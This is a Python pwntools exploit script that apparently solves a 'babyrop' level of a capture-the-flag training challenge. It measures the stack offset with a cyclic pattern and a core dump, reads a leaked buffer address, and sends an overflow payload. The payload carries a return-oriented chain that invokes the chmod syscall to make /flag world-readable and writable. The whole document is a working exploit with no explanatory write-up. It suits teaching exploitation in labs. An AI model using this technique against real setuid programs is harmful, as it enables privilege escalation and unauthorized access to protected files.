#!usr/bin/python3
from pwn import *

# Setup the machine architecture
context.arch = "amd64"

# Retrieve the ELF information from the binary
elf = ELF("/challenge/babyrop_level4.0")

# Initialize the ROP module
rop = ROP(elf)

# Run the program
io = elf.process(setuid=False)

# Build and send the payload to the program
# NOTE: cyclic function setup a pattern payload that with
#       cyclic_find can be used to retrieve the distance
#       between buffer and return address
io.sendline(cyclic(512, n=8))
io.wait()
buffer_length = cyclic_find(io.corefile.fault_addr, n=8)

# Run the program another time
io = elf.process()

# Retrieve the buffer address where we load the name of the file to chmod
io.recvuntil(b'is located at: 0x')
buff_addr = p64(int(io.recvuntil(b'.')[:-1], 16))

# Build the rop chain in order to:
# - Setup the rax register with the "chmod" system call number
# - Setup the rdi register with the name of the file (1st parameter)
# - Setup the rsi register with the flags to set (2nd parameter)
# - Execute syscall
CHAIN = p64(rop.rax.address) + p64(0x5A) +\
    p64(rop.rdi.address) + buff_addr +\
    p64(rop.rsi.address) + p64(0o777) +\
    p64(rop.syscall.address)

# Setup the file name
filename = b'/flag\x00'

# Build and send the payload to the program
PAYLOAD = filename + b'A'*(buffer_length - len(filename)) + CHAIN
io.sendline(PAYLOAD)

# Print the output of the program
print(io.recvall().decode(errors='ignore'))